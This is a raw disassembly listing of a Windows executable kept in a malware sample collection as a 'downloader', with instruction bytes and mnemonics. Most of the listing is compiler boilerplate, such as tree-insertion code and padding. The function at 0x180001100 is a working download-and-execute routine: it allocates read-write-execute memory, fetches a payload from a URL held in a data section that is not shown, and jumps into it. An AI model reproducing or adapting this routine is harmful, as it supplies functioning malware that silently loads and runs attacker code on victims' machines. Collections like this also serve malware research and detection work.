
malware_samples/downloader/8e64bacaf40110547b334eadcb0792bdc891d7ae298fbfff1367125797b6036b.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	48 83 ec 28          	sub    $0x28,%rsp
   180001004:	b9 48 00 00 00       	mov    $0x48,%ecx
   180001009:	e8 5a 0e 00 00       	call   0x180001e68
   18000100e:	48 8d 0d 4b e8 00 00 	lea    0xe84b(%rip),%rcx        # 0x18000f860
   180001015:	48 89 00             	mov    %rax,(%rax)
   180001018:	48 89 40 08          	mov    %rax,0x8(%rax)
   18000101c:	48 89 40 10          	mov    %rax,0x10(%rax)
   180001020:	66 c7 40 18 01 01    	movw   $0x101,0x18(%rax)
   180001026:	48 89 05 93 ac 01 00 	mov    %rax,0x1ac93(%rip)        # 0x18001bcc0
   18000102d:	48 83 c4 28          	add    $0x28,%rsp
   180001031:	e9 12 0e 00 00       	jmp    0x180001e48
   180001036:	cc                   	int3
   180001037:	cc                   	int3
   180001038:	cc                   	int3
   180001039:	cc                   	int3
   18000103a:	cc                   	int3
   18000103b:	cc                   	int3
   18000103c:	cc                   	int3
   18000103d:	cc                   	int3
   18000103e:	cc                   	int3
   18000103f:	cc                   	int3
   180001040:	48 83 ec 28          	sub    $0x28,%rsp
   180001044:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   180001049:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   180001050:	00 
   180001051:	e8 aa 01 00 00       	call   0x180001200
   180001056:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   18000105c:	48 8d 15 fd 66 01 00 	lea    0x166fd(%rip),%rdx        # 0x180017760
   180001063:	48 8b c8             	mov    %rax,%rcx
   180001066:	e8 e5 07 00 00       	call   0x180001850
   18000106b:	48 83 c4 28          	add    $0x28,%rsp
   18000106f:	c3                   	ret
   180001070:	48 83 ec 28          	sub    $0x28,%rsp
   180001074:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   180001079:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   180001080:	00 
   180001081:	e8 7a 01 00 00       	call   0x180001200
   180001086:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   18000108c:	48 8d 15 dd 66 01 00 	lea    0x166dd(%rip),%rdx        # 0x180017770
   180001093:	48 8b c8             	mov    %rax,%rcx
   180001096:	e8 b5 07 00 00       	call   0x180001850
   18000109b:	48 83 c4 28          	add    $0x28,%rsp
   18000109f:	c3                   	ret
   1800010a0:	48 83 ec 28          	sub    $0x28,%rsp
   1800010a4:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1800010a9:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   1800010b0:	00 
   1800010b1:	e8 4a 01 00 00       	call   0x180001200
   1800010b6:	41 b8 0b 00 00 00    	mov    $0xb,%r8d
   1800010bc:	48 8d 15 bd 66 01 00 	lea    0x166bd(%rip),%rdx        # 0x180017780
   1800010c3:	48 8b c8             	mov    %rax,%rcx
   1800010c6:	e8 85 07 00 00       	call   0x180001850
   1800010cb:	48 83 c4 28          	add    $0x28,%rsp
   1800010cf:	c3                   	ret
   1800010d0:	48 83 ec 28          	sub    $0x28,%rsp
   1800010d4:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1800010d9:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   1800010e0:	00 
   1800010e1:	e8 1a 01 00 00       	call   0x180001200
   1800010e6:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   1800010ec:	48 8d 15 9d 66 01 00 	lea    0x1669d(%rip),%rdx        # 0x180017790
   1800010f3:	48 8b c8             	mov    %rax,%rcx
   1800010f6:	e8 55 07 00 00       	call   0x180001850
   1800010fb:	48 83 c4 28          	add    $0x28,%rsp
   1800010ff:	c3                   	ret
   180001100:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001105:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000110a:	57                   	push   %rdi
   18000110b:	48 83 ec 40          	sub    $0x40,%rsp
   18000110f:	48 8b 05 fa 8e 01 00 	mov    0x18efa(%rip),%rax        # 0x18001a010
   180001116:	48 33 c4             	xor    %rsp,%rax
   180001119:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   18000111e:	33 c9                	xor    %ecx,%ecx
   180001120:	ba 00 00 02 00       	mov    $0x20000,%edx
   180001125:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   18000112b:	44 8d 49 40          	lea    0x40(%rcx),%r9d
   18000112f:	ff 15 e3 ee 00 00    	call   *0xeee3(%rip)        # 0x180010018
   180001135:	45 33 c9             	xor    %r9d,%r9d
   180001138:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   18000113f:	00 
   180001140:	45 33 c0             	xor    %r8d,%r8d
   180001143:	33 d2                	xor    %edx,%edx
   180001145:	33 c9                	xor    %ecx,%ecx
   180001147:	48 8b f8             	mov    %rax,%rdi
   18000114a:	ff 15 f8 f0 00 00    	call   *0xf0f8(%rip)        # 0x180010248
   180001150:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   180001157:	00 00 
   180001159:	48 8d 15 40 66 01 00 	lea    0x16640(%rip),%rdx        # 0x1800177a0
   180001160:	48 8b c8             	mov    %rax,%rcx
   180001163:	c7 44 24 20 00 00 20 	movl   $0x80200000,0x20(%rsp)
   18000116a:	80 
   18000116b:	45 33 c9             	xor    %r9d,%r9d
   18000116e:	45 33 c0             	xor    %r8d,%r8d
   180001171:	48 8b d8             	mov    %rax,%rbx
   180001174:	ff 15 c6 f0 00 00    	call   *0xf0c6(%rip)        # 0x180010240
   18000117a:	48 8b f0             	mov    %rax,%rsi
   18000117d:	48 85 c0             	test   %rax,%rax
   180001180:	75 0b                	jne    0x18000118d
   180001182:	48 8b cb             	mov    %rbx,%rcx
   180001185:	ff 15 ad f0 00 00    	call   *0xf0ad(%rip)        # 0x180010238
   18000118b:	eb 3a                	jmp    0x1800011c7
   18000118d:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   180001192:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   180001199:	00 
   18000119a:	41 b8 00 00 02 00    	mov    $0x20000,%r8d
   1800011a0:	48 8b d7             	mov    %rdi,%rdx
   1800011a3:	48 8b ce             	mov    %rsi,%rcx
   1800011a6:	ff 15 84 f0 00 00    	call   *0xf084(%rip)        # 0x180010230
   1800011ac:	48 8b ce             	mov    %rsi,%rcx
   1800011af:	ff 15 83 f0 00 00    	call   *0xf083(%rip)        # 0x180010238
   1800011b5:	48 8b cb             	mov    %rbx,%rcx
   1800011b8:	ff 15 7a f0 00 00    	call   *0xf07a(%rip)        # 0x180010238
   1800011be:	83 7c 24 30 00       	cmpl   $0x0,0x30(%rsp)
   1800011c3:	76 02                	jbe    0x1800011c7
   1800011c5:	ff d7                	call   *%rdi
   1800011c7:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1800011cc:	48 33 cc             	xor    %rsp,%rcx
   1800011cf:	e8 ec 08 00 00       	call   0x180001ac0
   1800011d4:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1800011d9:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1800011de:	48 83 c4 40          	add    $0x40,%rsp
   1800011e2:	5f                   	pop    %rdi
   1800011e3:	c3                   	ret
   1800011e4:	cc                   	int3
   1800011e5:	cc                   	int3
   1800011e6:	cc                   	int3
   1800011e7:	cc                   	int3
   1800011e8:	cc                   	int3
   1800011e9:	cc                   	int3
   1800011ea:	cc                   	int3
   1800011eb:	cc                   	int3
   1800011ec:	cc                   	int3
   1800011ed:	cc                   	int3
   1800011ee:	cc                   	int3
   1800011ef:	cc                   	int3
   1800011f0:	b8 01 00 00 00       	mov    $0x1,%eax
   1800011f5:	c3                   	ret
   1800011f6:	cc                   	int3
   1800011f7:	cc                   	int3
   1800011f8:	cc                   	int3
   1800011f9:	cc                   	int3
   1800011fa:	cc                   	int3
   1800011fb:	cc                   	int3
   1800011fc:	cc                   	int3
   1800011fd:	cc                   	int3
   1800011fe:	cc                   	int3
   1800011ff:	cc                   	int3
   180001200:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001205:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000120a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000120f:	57                   	push   %rdi
   180001210:	48 83 ec 50          	sub    $0x50,%rsp
   180001214:	48 8b fa             	mov    %rdx,%rdi
   180001217:	48 8b 1d a2 aa 01 00 	mov    0x1aaa2(%rip),%rbx        # 0x18001bcc0
   18000121e:	48 8b 43 08          	mov    0x8(%rbx),%rax
   180001222:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180001227:	33 ed                	xor    %ebp,%ebp
   180001229:	89 6c 24 38          	mov    %ebp,0x38(%rsp)
   18000122d:	48 8b cb             	mov    %rbx,%rcx
   180001230:	40 38 68 19          	cmp    %bpl,0x19(%rax)
   180001234:	75 33                	jne    0x180001269
   180001236:	44 8b 02             	mov    (%rdx),%r8d
   180001239:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180001240:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180001245:	44 39 40 20          	cmp    %r8d,0x20(%rax)
   180001249:	7d 0a                	jge    0x180001255
   18000124b:	89 6c 24 38          	mov    %ebp,0x38(%rsp)
   18000124f:	48 8b 40 10          	mov    0x10(%rax),%rax
   180001253:	eb 0e                	jmp    0x180001263
   180001255:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   18000125c:	00 
   18000125d:	48 8b c8             	mov    %rax,%rcx
   180001260:	48 8b 00             	mov    (%rax),%rax
   180001263:	40 38 68 19          	cmp    %bpl,0x19(%rax)
   180001267:	74 d7                	je     0x180001240
   180001269:	40 38 69 19          	cmp    %bpl,0x19(%rcx)
   18000126d:	75 07                	jne    0x180001276
   18000126f:	8b 41 20             	mov    0x20(%rcx),%eax
   180001272:	39 02                	cmp    %eax,(%rdx)
   180001274:	7d 73                	jge    0x1800012e9
   180001276:	48 b8 8e e3 38 8e e3 	movabs $0x38e38e38e38e38e,%rax
   18000127d:	38 8e 03 
   180001280:	48 39 05 41 aa 01 00 	cmp    %rax,0x1aa41(%rip)        # 0x18001bcc8
   180001287:	74 79                	je     0x180001302
   180001289:	48 8d 35 30 aa 01 00 	lea    0x1aa30(%rip),%rsi        # 0x18001bcc0
   180001290:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180001295:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   18000129a:	b9 48 00 00 00       	mov    $0x48,%ecx
   18000129f:	e8 c4 0b 00 00       	call   0x180001e68
   1800012a4:	4c 8b c0             	mov    %rax,%r8
   1800012a7:	8b 07                	mov    (%rdi),%eax
   1800012a9:	41 89 40 20          	mov    %eax,0x20(%r8)
   1800012ad:	49 89 68 28          	mov    %rbp,0x28(%r8)
   1800012b1:	49 89 68 38          	mov    %rbp,0x38(%r8)
   1800012b5:	49 c7 40 40 0f 00 00 	movq   $0xf,0x40(%r8)
   1800012bc:	00 
   1800012bd:	49 89 18             	mov    %rbx,(%r8)
   1800012c0:	49 89 58 08          	mov    %rbx,0x8(%r8)
   1800012c4:	49 89 58 10          	mov    %rbx,0x10(%r8)
   1800012c8:	66 41 c7 40 18 00 00 	movw   $0x0,0x18(%r8)
   1800012cf:	0f 10 44 24 30       	movups 0x30(%rsp),%xmm0
   1800012d4:	0f 29 44 24 20       	movaps %xmm0,0x20(%rsp)
   1800012d9:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1800012de:	48 8b ce             	mov    %rsi,%rcx
   1800012e1:	e8 2a 00 00 00       	call   0x180001310
   1800012e6:	48 8b c8             	mov    %rax,%rcx
   1800012e9:	48 8d 41 28          	lea    0x28(%rcx),%rax
   1800012ed:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1800012f2:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   1800012f7:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   1800012fc:	48 83 c4 50          	add    $0x50,%rsp
   180001300:	5f                   	pop    %rdi
   180001301:	c3                   	ret
   180001302:	e8 69 03 00 00       	call   0x180001670
   180001307:	cc                   	int3
   180001308:	cc                   	int3
   180001309:	cc                   	int3
   18000130a:	cc                   	int3
   18000130b:	cc                   	int3
   18000130c:	cc                   	int3
   18000130d:	cc                   	int3
   18000130e:	cc                   	int3
   18000130f:	cc                   	int3
   180001310:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001315:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   18000131a:	48 ff 41 08          	incq   0x8(%rcx)
   18000131e:	4d 8b d8             	mov    %r8,%r11
   180001321:	48 8b 39             	mov    (%rcx),%rdi
   180001324:	48 8b d9             	mov    %rcx,%rbx
   180001327:	48 8b 02             	mov    (%rdx),%rax
   18000132a:	49 89 40 08          	mov    %rax,0x8(%r8)
   18000132e:	48 3b c7             	cmp    %rdi,%rax
   180001331:	75 1e                	jne    0x180001351
   180001333:	4c 89 07             	mov    %r8,(%rdi)
   180001336:	49 8b c0             	mov    %r8,%rax
   180001339:	4c 89 47 08          	mov    %r8,0x8(%rdi)
   18000133d:	4c 89 47 10          	mov    %r8,0x10(%rdi)
   180001341:	41 c6 40 18 01       	movb   $0x1,0x18(%r8)
   180001346:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   18000134b:	48 8b 7c 24 10       	mov    0x10(%rsp),%rdi
   180001350:	c3                   	ret
   180001351:	83 7a 08 00          	cmpl   $0x0,0x8(%rdx)
   180001355:	75 10                	jne    0x180001367
   180001357:	4c 89 58 10          	mov    %r11,0x10(%rax)
   18000135b:	48 3b 47 10          	cmp    0x10(%rdi),%rax
   18000135f:	75 11                	jne    0x180001372
   180001361:	4c 89 5f 10          	mov    %r11,0x10(%rdi)
   180001365:	eb 0b                	jmp    0x180001372
   180001367:	4c 89 18             	mov    %r11,(%rax)
   18000136a:	48 3b 07             	cmp    (%rdi),%rax
   18000136d:	75 03                	jne    0x180001372
   18000136f:	4c 89 1f             	mov    %r11,(%rdi)
   180001372:	49 8b 40 08          	mov    0x8(%r8),%rax
   180001376:	49 8b d3             	mov    %r11,%rdx
   180001379:	80 78 18 00          	cmpb   $0x0,0x18(%rax)
   18000137d:	0f 85 f4 01 00 00    	jne    0x180001577
   180001383:	0f 1f 40 00          	nopl   0x0(%rax)
   180001387:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000138e:	00 00 
   180001390:	48 8b 4a 08          	mov    0x8(%rdx),%rcx
   180001394:	4c 8d 4a 08          	lea    0x8(%rdx),%r9
   180001398:	4c 8b 41 08          	mov    0x8(%rcx),%r8
   18000139c:	4c 8d 51 08          	lea    0x8(%rcx),%r10
   1800013a0:	49 8b 00             	mov    (%r8),%rax
   1800013a3:	48 3b c8             	cmp    %rax,%rcx
   1800013a6:	0f 85 e5 00 00 00    	jne    0x180001491
   1800013ac:	49 8b 40 10          	mov    0x10(%r8),%rax
   1800013b0:	80 78 18 00          	cmpb   $0x0,0x18(%rax)
   1800013b4:	0f 84 dd 00 00 00    	je     0x180001497
   1800013ba:	4c 8b 41 10          	mov    0x10(%rcx),%r8
   1800013be:	49 3b d0             	cmp    %r8,%rdx
   1800013c1:	75 5b                	jne    0x18000141e
   1800013c3:	49 8b 00             	mov    (%r8),%rax
   1800013c6:	48 8b d1             	mov    %rcx,%rdx
   1800013c9:	48 89 41 10          	mov    %rax,0x10(%rcx)
   1800013cd:	49 8b 00             	mov    (%r8),%rax
   1800013d0:	80 78 19 00          	cmpb   $0x0,0x19(%rax)
   1800013d4:	75 04                	jne    0x1800013da
   1800013d6:	48 89 48 08          	mov    %rcx,0x8(%rax)
   1800013da:	49 8b 02             	mov    (%r10),%rax
   1800013dd:	49 89 40 08          	mov    %rax,0x8(%r8)
   1800013e1:	48 8b 03             	mov    (%rbx),%rax
   1800013e4:	48 3b 48 08          	cmp    0x8(%rax),%rcx
   1800013e8:	75 0f                	jne    0x1800013f9
   1800013ea:	4c 89 40 08          	mov    %r8,0x8(%rax)
   1800013ee:	4d 8b ca             	mov    %r10,%r9
   1800013f1:	49 89 08             	mov    %rcx,(%r8)
   1800013f4:	4d 89 02             	mov    %r8,(%r10)
   1800013f7:	eb 28                	jmp    0x180001421
   1800013f9:	49 8b 02             	mov    (%r10),%rax
   1800013fc:	48 3b 08             	cmp    (%rax),%rcx
   1800013ff:	75 0e                	jne    0x18000140f
   180001401:	4c 89 00             	mov    %r8,(%rax)
   180001404:	4d 8b ca             	mov    %r10,%r9
   180001407:	49 89 08             	mov    %rcx,(%r8)
   18000140a:	4d 89 02             	mov    %r8,(%r10)
   18000140d:	eb 12                	jmp    0x180001421
   18000140f:	4c 89 40 10          	mov    %r8,0x10(%rax)
   180001413:	4d 8b ca             	mov    %r10,%r9
   180001416:	49 89 08             	mov    %rcx,(%r8)
   180001419:	4d 89 02             	mov    %r8,(%r10)
   18000141c:	eb 03                	jmp    0x180001421
   18000141e:	4c 8b c1             	mov    %rcx,%r8
   180001421:	41 c6 40 18 01       	movb   $0x1,0x18(%r8)
   180001426:	49 8b 01             	mov    (%r9),%rax
   180001429:	48 8b 48 08          	mov    0x8(%rax),%rcx
   18000142d:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   180001431:	49 8b 01             	mov    (%r9),%rax
   180001434:	48 8b 48 08          	mov    0x8(%rax),%rcx
   180001438:	4c 8b 01             	mov    (%rcx),%r8
   18000143b:	49 8b 40 10          	mov    0x10(%r8),%rax
   18000143f:	48 89 01             	mov    %rax,(%rcx)
   180001442:	49 8b 40 10          	mov    0x10(%r8),%rax
   180001446:	80 78 19 00          	cmpb   $0x0,0x19(%rax)
   18000144a:	75 04                	jne    0x180001450
   18000144c:	48 89 48 08          	mov    %rcx,0x8(%rax)
   180001450:	48 8b 41 08          	mov    0x8(%rcx),%rax
   180001454:	49 89 40 08          	mov    %rax,0x8(%r8)
   180001458:	48 8b 03             	mov    (%rbx),%rax
   18000145b:	48 3b 48 08          	cmp    0x8(%rax),%rcx
   18000145f:	75 0d                	jne    0x18000146e
   180001461:	4c 89 40 08          	mov    %r8,0x8(%rax)
   180001465:	49 89 48 10          	mov    %rcx,0x10(%r8)
   180001469:	e9 f7 00 00 00       	jmp    0x180001565
   18000146e:	48 8b 41 08          	mov    0x8(%rcx),%rax
   180001472:	48 3b 48 10          	cmp    0x10(%rax),%rcx
   180001476:	75 0d                	jne    0x180001485
   180001478:	4c 89 40 10          	mov    %r8,0x10(%rax)
   18000147c:	49 89 48 10          	mov    %rcx,0x10(%r8)
   180001480:	e9 e0 00 00 00       	jmp    0x180001565
   180001485:	4c 89 00             	mov    %r8,(%rax)
   180001488:	49 89 48 10          	mov    %rcx,0x10(%r8)
   18000148c:	e9 d4 00 00 00       	jmp    0x180001565
   180001491:	80 78 18 00          	cmpb   $0x0,0x18(%rax)
   180001495:	75 1f                	jne    0x1800014b6
   180001497:	c6 41 18 01          	movb   $0x1,0x18(%rcx)
   18000149b:	c6 40 18 01          	movb   $0x1,0x18(%rax)
   18000149f:	49 8b 01             	mov    (%r9),%rax
   1800014a2:	48 8b 48 08          	mov    0x8(%rax),%rcx
   1800014a6:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   1800014aa:	49 8b 01             	mov    (%r9),%rax
   1800014ad:	48 8b 50 08          	mov    0x8(%rax),%rdx
   1800014b1:	e9 b3 00 00 00       	jmp    0x180001569
   1800014b6:	48 8b 01             	mov    (%rcx),%rax
   1800014b9:	48 3b d0             	cmp    %rax,%rdx
   1800014bc:	75 4d                	jne    0x18000150b
   1800014be:	48 8b d1             	mov    %rcx,%rdx
   1800014c1:	48 8b c8             	mov    %rax,%rcx
   1800014c4:	48 8b 40 10          	mov    0x10(%rax),%rax
   1800014c8:	48 89 02             	mov    %rax,(%rdx)
   1800014cb:	48 8b 41 10          	mov    0x10(%rcx),%rax
   1800014cf:	80 78 19 00          	cmpb   $0x0,0x19(%rax)
   1800014d3:	75 04                	jne    0x1800014d9
   1800014d5:	48 89 50 08          	mov    %rdx,0x8(%rax)
   1800014d9:	49 8b 02             	mov    (%r10),%rax
   1800014dc:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1800014e0:	48 8b 03             	mov    (%rbx),%rax
   1800014e3:	48 3b 50 08          	cmp    0x8(%rax),%rdx
   1800014e7:	75 06                	jne    0x1800014ef
   1800014e9:	48 89 48 08          	mov    %rcx,0x8(%rax)
   1800014ed:	eb 12                	jmp    0x180001501
   1800014ef:	49 8b 02             	mov    (%r10),%rax
   1800014f2:	48 3b 50 10          	cmp    0x10(%rax),%rdx
   1800014f6:	75 06                	jne    0x1800014fe
   1800014f8:	48 89 48 10          	mov    %rcx,0x10(%rax)
   1800014fc:	eb 03                	jmp    0x180001501
   1800014fe:	48 89 08             	mov    %rcx,(%rax)
   180001501:	48 89 51 10          	mov    %rdx,0x10(%rcx)
   180001505:	4d 8b ca             	mov    %r10,%r9
   180001508:	49 89 0a             	mov    %rcx,(%r10)
   18000150b:	c6 41 18 01          	movb   $0x1,0x18(%rcx)
   18000150f:	49 8b 01             	mov    (%r9),%rax
   180001512:	48 8b 48 08          	mov    0x8(%rax),%rcx
   180001516:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   18000151a:	49 8b 01             	mov    (%r9),%rax
   18000151d:	48 8b 48 08          	mov    0x8(%rax),%rcx
   180001521:	4c 8b 41 10          	mov    0x10(%rcx),%r8
   180001525:	49 8b 00             	mov    (%r8),%rax
   180001528:	48 89 41 10          	mov    %rax,0x10(%rcx)
   18000152c:	49 8b 00             	mov    (%r8),%rax
   18000152f:	80 78 19 00          	cmpb   $0x0,0x19(%rax)
   180001533:	75 04                	jne    0x180001539
   180001535:	48 89 48 08          	mov    %rcx,0x8(%rax)
   180001539:	48 8b 41 08          	mov    0x8(%rcx),%rax
   18000153d:	49 89 40 08          	mov    %rax,0x8(%r8)
   180001541:	48 8b 03             	mov    (%rbx),%rax
   180001544:	48 3b 48 08          	cmp    0x8(%rax),%rcx
   180001548:	75 06                	jne    0x180001550
   18000154a:	4c 89 40 08          	mov    %r8,0x8(%rax)
   18000154e:	eb 12                	jmp    0x180001562
   180001550:	48 8b 41 08          	mov    0x8(%rcx),%rax
   180001554:	48 3b 08             	cmp    (%rax),%rcx
   180001557:	75 05                	jne    0x18000155e
   180001559:	4c 89 00             	mov    %r8,(%rax)
   18000155c:	eb 04                	jmp    0x180001562
   18000155e:	4c 89 40 10          	mov    %r8,0x10(%rax)
   180001562:	49 89 08             	mov    %rcx,(%r8)
   180001565:	4c 89 41 08          	mov    %r8,0x8(%rcx)
   180001569:	48 8b 42 08          	mov    0x8(%rdx),%rax
   18000156d:	80 78 18 00          	cmpb   $0x0,0x18(%rax)
   180001571:	0f 84 19 fe ff ff    	je     0x180001390
   180001577:	48 8b 47 08          	mov    0x8(%rdi),%rax
   18000157b:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   180001580:	48 8b 7c 24 10       	mov    0x10(%rsp),%rdi
   180001585:	c6 40 18 01          	movb   $0x1,0x18(%rax)
   180001589:	49 8b c3             	mov    %r11,%rax
   18000158c:	c3                   	ret
   18000158d:	cc                   	int3
   18000158e:	cc                   	int3
   18000158f:	cc                   	int3
   180001590:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   180001594:	48 85 c9             	test   %rcx,%rcx
   180001597:	74 0a                	je     0x1800015a3
   180001599:	ba 48 00 00 00       	mov    $0x48,%edx
   18000159e:	e9 bd 08 00 00       	jmp    0x180001e60
   1800015a3:	c3                   	ret
   1800015a4:	cc                   	int3
   1800015a5:	cc                   	int3
   1800015a6:	cc                   	int3
   1800015a7:	cc                   	int3
   1800015a8:	cc                   	int3
   1800015a9:	cc                   	int3
   1800015aa:	cc                   	int3
   1800015ab:	cc                   	int3
   1800015ac:	cc                   	int3
   1800015ad:	cc                   	int3
   1800015ae:	cc                   	int3
   1800015af:	cc                   	int3
   1800015b0:	40 55                	rex push %rbp
   1800015b2:	56                   	push   %rsi
   1800015b3:	57                   	push   %rdi
   1800015b4:	48 83 ec 30          	sub    $0x30,%rsp
   1800015b8:	41 80 78 19 00       	cmpb   $0x0,0x19(%r8)
   1800015bd:	49 8b f8             	mov    %r8,%rdi
   1800015c0:	48 8b ea             	mov    %rdx,%rbp
   1800015c3:	48 8b f1             	mov    %rcx,%rsi
   1800015c6:	0f 85 8d 00 00 00    	jne    0x180001659
   1800015cc:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   1800015d1:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1800015d6:	45 33 f6             	xor    %r14d,%r14d
   1800015d9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1800015e0:	4c 8b 47 10          	mov    0x10(%rdi),%r8
   1800015e4:	48 8b d5             	mov    %rbp,%rdx
   1800015e7:	48 8b ce             	mov    %rsi,%rcx
   1800015ea:	e8 c1 ff ff ff       	call   0x1800015b0
   1800015ef:	48 8b df             	mov    %rdi,%rbx
   1800015f2:	48 8b 3f             	mov    (%rdi),%rdi
   1800015f5:	48 8b 53 40          	mov    0x40(%rbx),%rdx
   1800015f9:	48 83 fa 10          	cmp    $0x10,%rdx
   1800015fd:	72 2d                	jb     0x18000162c
   1800015ff:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   180001603:	48 ff c2             	inc    %rdx
   180001606:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   18000160d:	72 18                	jb     0x180001627
   18000160f:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   180001613:	48 83 c2 27          	add    $0x27,%rdx
   180001617:	49 2b c8             	sub    %r8,%rcx
   18000161a:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   18000161e:	48 83 f8 1f          	cmp    $0x1f,%rax
   180001622:	77 3d                	ja     0x180001661
   180001624:	49 8b c8             	mov    %r8,%rcx
   180001627:	e8 34 08 00 00       	call   0x180001e60
   18000162c:	ba 48 00 00 00       	mov    $0x48,%edx
   180001631:	4c 89 73 38          	mov    %r14,0x38(%rbx)
   180001635:	48 8b cb             	mov    %rbx,%rcx
   180001638:	48 c7 43 40 0f 00 00 	movq   $0xf,0x40(%rbx)
   18000163f:	00 
   180001640:	44 88 73 28          	mov    %r14b,0x28(%rbx)
   180001644:	e8 17 08 00 00       	call   0x180001e60
   180001649:	44 38 77 19          	cmp    %r14b,0x19(%rdi)
   18000164d:	74 91                	je     0x1800015e0
   18000164f:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   180001654:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   180001659:	48 83 c4 30          	add    $0x30,%rsp
   18000165d:	5f                   	pop    %rdi
   18000165e:	5e                   	pop    %rsi
   18000165f:	5d                   	pop    %rbp
   180001660:	c3                   	ret
   180001661:	e8 f6 4f 00 00       	call   0x18000665c
   180001666:	cc                   	int3
   180001667:	cc                   	int3
   180001668:	cc                   	int3
   180001669:	cc                   	int3
   18000166a:	cc                   	int3
   18000166b:	cc                   	int3
   18000166c:	cc                   	int3
   18000166d:	cc                   	int3
   18000166e:	cc                   	int3
   18000166f:	cc                   	int3
   180001670:	48 83 ec 28          	sub    $0x28,%rsp
   180001674:	48 8d 0d 4d 61 01 00 	lea    0x1614d(%rip),%rcx        # 0x1800177c8
   18000167b:	e8 08 04 00 00       	call   0x180001a88
   180001680:	cc                   	int3
   180001681:	cc                   	int3
   180001682:	cc                   	int3
   180001683:	cc                   	int3
   180001684:	cc                   	int3
   180001685:	cc                   	int3
   180001686:	cc                   	int3
   180001687:	cc                   	int3
   180001688:	cc                   	int3
   180001689:	cc                   	int3
   18000168a:	cc                   	int3
   18000168b:	cc                   	int3
   18000168c:	cc                   	int3
   18000168d:	cc                   	int3
   18000168e:	cc                   	int3
   18000168f:	cc                   	int3
   180001690:	48 83 ec 28          	sub    $0x28,%rsp
   180001694:	48 8d 0d 45 61 01 00 	lea    0x16145(%rip),%rcx        # 0x1800177e0
   18000169b:	e8 e8 03 00 00       	call   0x180001a88
   1800016a0:	cc                   	int3
   1800016a1:	cc                   	int3
   1800016a2:	cc                   	int3
   1800016a3:	cc                   	int3
   1800016a4:	cc                   	int3
   1800016a5:	cc                   	int3
   1800016a6:	cc                   	int3
   1800016a7:	cc                   	int3
   1800016a8:	cc                   	int3
   1800016a9:	cc                   	int3
   1800016aa:	cc                   	int3
   1800016ab:	cc                   	int3
   1800016ac:	cc                   	int3
   1800016ad:	cc                   	int3
   1800016ae:	cc                   	int3
   1800016af:	cc                   	int3
   1800016b0:	48 8d 05 39 61 01 00 	lea    0x16139(%rip),%rax        # 0x1800177f0
   1800016b7:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   1800016be:	00 
   1800016bf:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1800016c3:	48 8d 05 e6 ec 00 00 	lea    0xece6(%rip),%rax        # 0x1800103b0
   1800016ca:	48 89 01             	mov    %rax,(%rcx)
   1800016cd:	48 8b c1             	mov    %rcx,%rax
   1800016d0:	c3                   	ret
   1800016d1:	cc                   	int3
   1800016d2:	cc                   	int3
   1800016d3:	cc                   	int3
   1800016d4:	cc                   	int3
   1800016d5:	cc                   	int3
   1800016d6:	cc                   	int3
   1800016d7:	cc                   	int3
   1800016d8:	cc                   	int3
   1800016d9:	cc                   	int3
   1800016da:	cc                   	int3
   1800016db:	cc                   	int3
   1800016dc:	cc                   	int3
   1800016dd:	cc                   	int3
   1800016de:	cc                   	int3
   1800016df:	cc                   	int3
